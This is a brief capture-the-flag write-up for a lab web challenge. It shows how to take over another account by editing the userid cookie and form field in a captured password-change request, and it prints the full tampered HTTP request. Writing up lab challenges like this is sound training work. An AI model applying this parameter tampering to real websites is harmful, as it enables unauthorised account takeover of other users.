First view page source. You will see `signup.php`.

Go to /signup.php and create a new accout and then signin.

After signin, You will see that your userid is 6 and at the url `http://cdcamxwl32pue3e6mkm73pe2cqzqw0wz0wkr5cwzo-web.cybertalentslabs.com/profile/?id=6`.
Even If you change id=6 to id=1, you wont be able to see anything.

Theres a button called setting and when you go there you'll see that you can change password. Change the password and capture that request in burpsuite.
The Request will look something like this:
```
POST /profile/change.php HTTP/1.1
Host: cdcamxwl32pue3e6mkm73pe2cqzqw0wz0wkr5cwzo-web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://cdcamxwl32pue3e6mkm73pe2cqzqw0wz0wkr5cwzo-web.cybertalentslabs.com
Connection: keep-alive
Referer: http://cdcamxwl32pue3e6mkm73pe2cqzqw0wz0wkr5cwzo-web.cybertalentslabs.com/profile/settings.php
Cookie: PHPSESSID=69f95a101396dd470ffb6c031f211130; sessionid=937389616bfd718942d7833c87b5f81d; userid=1
Upgrade-Insecure-Requests: 1
Priority: u=0, i

newpass=test&userid=1&newrepass=test
```

Change all the userid to 1 and send. So this time if you set id=1 in the URL, you'll get the flag.
